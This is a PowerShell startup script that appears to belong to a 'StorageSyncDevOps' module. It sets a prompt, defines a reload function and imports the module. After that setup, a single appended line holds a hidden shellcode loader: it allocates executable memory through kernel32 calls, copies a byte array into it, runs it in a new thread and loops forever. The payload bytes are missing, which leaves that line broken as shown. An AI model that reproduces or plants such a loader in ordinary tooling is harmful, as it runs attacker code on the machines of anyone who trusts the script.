$ErrorActionPreference = "Stop"
$scriptpath = $MyInvocation.MyCommand.Path
$scriptDirectory = Split-Path $scriptpath
$scriptFileName = Split-Path $scriptpath -Leaf


function prompt 
{ 
    Write-Host "[$((Get-Location).Path)]"
    Write-Host "StorageSyncDevOps " -NoNewLine -foreground White
    "PS> "
}

function reload
{
    Remove-Module StorageSyncDevOps
    ipmo "$($scriptDirectory)\StorageSyncDevOps.psm1" -DisableNameChecking -Scope Global
}

ipmo "$($scriptDirectory)\StorageSyncDevOps.psm1" -DisableNameChecking -Scope Global
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

